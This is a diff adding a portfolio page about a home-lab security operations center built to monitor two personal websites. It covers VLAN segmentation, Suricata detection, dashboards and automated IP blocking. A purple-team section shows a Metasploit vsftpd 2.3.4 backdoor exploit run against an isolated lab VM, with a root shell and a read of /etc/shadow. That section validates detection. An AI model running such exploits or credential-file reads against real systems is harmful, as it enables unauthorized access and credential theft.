@@ -1,0 +1,232 @@
+---
+title: "HomeLab SOC v2"
+summary: "Production-grade Security Operations Center monitoring real websites with enterprise architecture"
+description: "They want experience I can't get without a job. So I built the job. A production SOC monitoring real websites with enterprise-grade detection, VLAN segmentation, and automated threat response."
+date: 2026-01-09
+status: active
+featured: true
+technologies:
+  - OpenSearch
+  - Suricata
+  - OPNsense
+  - Fluent Bit
+  - Docker
+  - Python
+  - Cloudflare
+  - Tailscale
+github: https://github.com/brianchaplow/HomeLab-SOC-v2
+permalink: /projects/homelab-soc/
+---
+
+import StatsCounter from '../../components/StatsCounter.astro';
+import ArchitectureDiagramInteractive from '../../components/ArchitectureDiagramInteractive.astro';
+import Terminal from '../../components/Terminal.astro';
+import DashboardGallery from '../../components/DashboardGallery.astro';
+import DashboardShowcase from '../../components/DashboardShowcase.astro';
+import EvolutionTimeline from '../../components/EvolutionTimeline.astro';
+
+<div class="not-prose text-center mb-12">
+  <p class="text-3xl md:text-4xl lg:text-5xl font-bold text-white leading-tight">They want experience I can't get without a job.</p>
+  <p class="text-3xl md:text-4xl lg:text-5xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-emerald-400 mt-2">So I built the job.</p>
+</div>
+
+<DashboardShowcase 
+  src="/images/projects/soc-homelab-v2/dashboard-soc-overview.png"
+  alt="SOC Overview Dashboard - Real-time security monitoring"
+  caption="Live SOC Dashboard — 51K+ alerts, 15 countries, real-time threat detection"
+/>
+
+<StatsCounter stats={[
+  { value: 51843, label: "Suricata Alerts" },
+  { value: 83704, label: "Windows Events" },
+  { value: 15, label: "Countries Detected" },
+  { value: 1459, suffix: "+", label: "IPs Auto-Blocked" }
+]} />
+
+## This Isn't a Tutorial Lab
+
+Every "entry-level" SOC analyst posting wants 2-3 years of experience. The classic catch-22: you can't get experience without a job, and you can't get a job without experience.
+
+So I built my own experience.
+
+This SOC monitors two production websites—**brianchaplow.com** and **bytesbourbonbbq.com**—in real-time. Real visitors. Real bots. Real attackers. When someone probes my sites from Romania or runs an Nmap scan from India, I see it, enrich it with threat intelligence, and automatically block them at the edge.
+
+That's not a lab exercise. That's production security operations.
+
+<div class="not-prose my-8 p-5 rounded-xl bg-cyan-500/10 border border-cyan-500/20">
+  <p><strong class="text-cyan-300">The difference:</strong> <span class="text-neutral-300">Most homelab SOCs monitor self-generated traffic or vulnerable VMs in isolation. This one monitors production internet traffic while <em>also</em> providing a purple team environment for attack simulation and detection engineering.</span></p>
+</div>
+
+## The Architecture
+
+The infrastructure spans three layers (edge, cloud, and on-premises) with traffic flowing from the internet through multiple security controls to a centralized SIEM.
+
+<ArchitectureDiagramInteractive />
+
+**Edge Layer (Cloudflare):** Both websites are proxied through Cloudflare with WAF rules, Bot Fight Mode, and JA3 TLS fingerprinting. When my SOC automation detects a malicious IP, it pushes a block to Cloudflare's API, stopping threats before they reach the origin.
+
+**Cloud Layer (GCP):** An e2-small VM runs Apache with Fluent Bit shipping parsed access logs. Every request includes geographic data from Cloudflare headers, giving me city-level visibility into who's visiting (or attacking) my sites.
+
+**Home Network:** A Protectli firewall running OPNsense segments traffic across five VLANs. A MokerLink 10G switch provides the backbone with port mirroring (SPAN) sending all traffic to the QNAP NAS running the SOC stack.
+
+## The SOC Stack
+
+Seven Docker containers on the QNAP handle detection, analysis, and response:
+
+<div class="not-prose grid grid-cols-2 gap-4 my-8">
+  <div class="group text-center p-5 rounded-xl bg-gradient-to-br from-white/5 to-transparent border border-white/10 hover:border-cyan-500/30 transition-all duration-300">
+    <div class="text-lg font-semibold text-cyan-400 group-hover:text-cyan-300">OpenSearch</div>
+    <div class="text-sm text-neutral-500 mt-1">SIEM & Log Storage</div>
+  </div>
+  <div class="group text-center p-5 rounded-xl bg-gradient-to-br from-white/5 to-transparent border border-white/10 hover:border-cyan-500/30 transition-all duration-300">
+    <div class="text-lg font-semibold text-cyan-400 group-hover:text-cyan-300">Suricata</div>
+    <div class="text-sm text-neutral-500 mt-1">47,290 IDS Rules</div>
+  </div>
+  <div class="group text-center p-5 rounded-xl bg-gradient-to-br from-white/5 to-transparent border border-white/10 hover:border-cyan-500/30 transition-all duration-300">
+    <div class="text-lg font-semibold text-cyan-400 group-hover:text-cyan-300">Fluent Bit</div>
+    <div class="text-sm text-neutral-500 mt-1">Log Aggregation</div>
+  </div>
+  <div class="group text-center p-5 rounded-xl bg-gradient-to-br from-white/5 to-transparent border border-white/10 hover:border-cyan-500/30 transition-all duration-300">
+    <div class="text-lg font-semibold text-cyan-400 group-hover:text-cyan-300">Automation</div>
+    <div class="text-sm text-neutral-500 mt-1">Enrichment & Response</div>
+  </div>
+</div>
+
+OpenSearch (a fork of Elasticsearch) provides the same SIEM capabilities as enterprise tools like Splunk: log ingestion, search, visualization, and alerting. The skills transfer directly. If you can build queries and dashboards here, you can do it anywhere.
+
+## Operational Alerting
+
+Detection without notification is just logging. The SOC pushes real-time alerts to Discord for immediate visibility, plus automated watch turnover briefs at 0600 and 1800 (mimicking SOC shift handoffs). A weekly summary rolls up the threat landscape every Sunday.
+
+This means I can monitor from my phone, get alerted when something interesting happens, and review structured summaries without digging through dashboards.
+
+## The Dashboards
+
+I built four purpose-specific dashboards, each answering different operational questions.
+
+<DashboardGallery dashboards={[
+  {
+    src: "/images/projects/soc-homelab-v2/dashboard-nids-detection.png",
+    alt: "NIDS dashboard showing Suricata alerts, signatures, and protocol distribution",
+    title: "NIDS - Detection Overview",
+    description: "Network detection focus: signatures triggered, protocol breakdown, and temporal patterns.",
+    highlight: "47,290 active rules"
+  },
+  {
+    src: "/images/projects/soc-homelab-v2/dashboard-windows-security.png",
+    alt: "Endpoint dashboard showing Windows event distribution across hosts",
+    title: "Endpoint - Windows Security",
+    description: "Endpoint telemetry across Active Directory lab with full Sysmon coverage.",
+    highlight: "83K+ Windows events"
+  },
+  {
+    src: "/images/projects/soc-homelab-v2/dashboard-threat-intel.png",
+    alt: "Threat Intelligence dashboard showing external IPs and geographic distribution",
+    title: "Threat Intelligence",
+    description: "External threat visibility with country attribution and automated enrichment.",
+    highlight: "15 countries detected"
+  }
+]} />
+
+## Purple Team Validation
+
+Building detection is half the job. Proving it works is the other half.
+
+With Kali on VLAN 20 and Metasploitable on VLAN 40, I run real exploits and verify detection. Here's CVE-2011-2523 — the vsftpd 2.3.4 backdoor:
+
+<Terminal 
+  title="butcher@sear — msfconsole"
+  promptUser="butcher"
+  promptHost="sear"
+  command='use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 10.10.40.20; run'
+  output={[
+    "[*] 10.10.40.20:21 - Banner: 220 (vsFTPd 2.3.4)",
+    "[*] 10.10.40.20:21 - USER: 331 Please specify the password.",
+    "[+] 10.10.40.20:21 - Backdoor service has been spawned, handling...",
+    "[+] 10.10.40.20:21 - UID: uid=0(root) gid=0(root)",
+    "[*] Found shell.",
+    "[*] Command shell session 1 opened (10.10.20.20:43829 -> 10.10.40.20:6200)",
+    "",
+    "[>] id",
+    "[+] uid=0(root) gid=0(root)",
+    "[>] hostname",
+    "[+] metasploitable",
+    "[>] cat /etc/shadow | head -2", 
+    "[+] root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::",
+    "[+] sys:*:14684:0:99999:7:::"
+  ]}
+/>
+
+**Suricata Detection:**
+- `ET EXPLOIT VSFTPD Backdoor User Login Attempt` triggered
+- Shell session 10.10.20.20 → 10.10.40.20:6200 logged
+- Full attack timeline in OpenSearch
+- Target isolated to VLAN 40 — no lateral movement possible
+
+This is purple team methodology: attack, detect, validate, improve. The VLAN segmentation means even if an attack succeeds, the blast radius is contained.
+
+## What This Demonstrates
+
+<div class="not-prose my-8 grid grid-cols-2 md:grid-cols-3 gap-4">
+  <div class="p-5 rounded-xl border border-white/10 bg-white/[0.02] hover:bg-white/[0.04] transition-colors">
+    <div class="text-lg mb-2">🔍</div>
+    <h4 class="font-semibold text-white mb-1">Detection Engineering</h4>
+    <p class="text-sm text-neutral-500">Building dashboards, tuning rules, correlating events across network and endpoint data</p>
+  </div>
+  <div class="p-5 rounded-xl border border-white/10 bg-white/[0.02] hover:bg-white/[0.04] transition-colors">
+    <div class="text-lg mb-2">📊</div>
+    <h4 class="font-semibold text-white mb-1">Log Pipeline Architecture</h4>
+    <p class="text-sm text-neutral-500">Fluent Bit parsing, OpenSearch ingest pipelines, cross-network log shipping</p>
+  </div>
+  <div class="p-5 rounded-xl border border-white/10 bg-white/[0.02] hover:bg-white/[0.04] transition-colors">
+    <div class="text-lg mb-2">🎯</div>
+    <h4 class="font-semibold text-white mb-1">Threat Intelligence</h4>
+    <p class="text-sm text-neutral-500">AbuseIPDB enrichment, automated blocking, GeoIP attribution</p>
+  </div>
+  <div class="p-5 rounded-xl border border-white/10 bg-white/[0.02] hover:bg-white/[0.04] transition-colors">
+    <div class="text-lg mb-2">🔐</div>
+    <h4 class="font-semibold text-white mb-1">Network Segmentation</h4>
+    <p class="text-sm text-neutral-500">VLAN design, firewall rules, traffic inspection via SPAN</p>
+  </div>
+  <div class="p-5 rounded-xl border border-white/10 bg-white/[0.02] hover:bg-white/[0.04] transition-colors">
+    <div class="text-lg mb-2">⚔️</div>
+    <h4 class="font-semibold text-white mb-1">Purple Team Operations</h4>
+    <p class="text-sm text-neutral-500">Attack simulation, detection validation, containment verification</p>
+  </div>
+  <div class="p-5 rounded-xl border border-cyan-500/20 bg-cyan-500/5 hover:bg-cyan-500/10 transition-colors">
+    <div class="text-lg mb-2">📋</div>
+    <h4 class="font-semibold text-cyan-400 mb-1">The Receipts</h4>
+    <p class="text-sm text-neutral-400">Every SOC analyst job posting asks for these skills. Now I have proof.</p>
+  </div>
+</div>
+
+---
+
+## Evolution from v1
+
+This build didn't appear overnight. It evolved from the [original HomeLab SOC](/projects/homelab-soc-v1/):
+
+<EvolutionTimeline items={[
+  { before: "TP-Link 1Gbps switch", after: "MokerLink 10G switch", improvement: "10x bandwidth" },
+  { before: "Flat network", after: "5 VLANs with OPNsense", improvement: "Segmentation" },
+  { before: "ISP router", after: "Protectli VP2420 firewall", improvement: "Proper routing" },
+  { before: "No attack isolation", after: "Dedicated purple team VLANs", improvement: "Safe testing" },
+  { before: "~100 IPs blocked", after: "1,459+ IPs blocked", improvement: "14x volume" }
+]} />
+
+Each limitation in v1 became a learning opportunity. The progression shows continuous improvement—exactly what employers want to see.
+
+<div class="not-prose mt-6 p-4 rounded-lg bg-white/5 border border-white/10">
+  <p class="text-sm text-neutral-400"><strong class="text-neutral-300">📁 See where it started:</strong> <a href="/projects/homelab-soc-v1/" class="text-cyan-400 hover:text-cyan-300 underline">HomeLab SOC v1</a> — The original architecture before VLAN segmentation and hardware upgrades.</p>
+</div>
+
+---
+
+## What's Next
+
+The infrastructure is operational, but there's always more to build:
+
+- **Sigma rules** for Windows event detection
+- **MITRE ATT&CK mapping** in dashboards
+- **Atomic Red Team** for automated attack simulation
+- **Additional vulnerable VMs** (VulnHub machines, HackTheBox retired boxes)
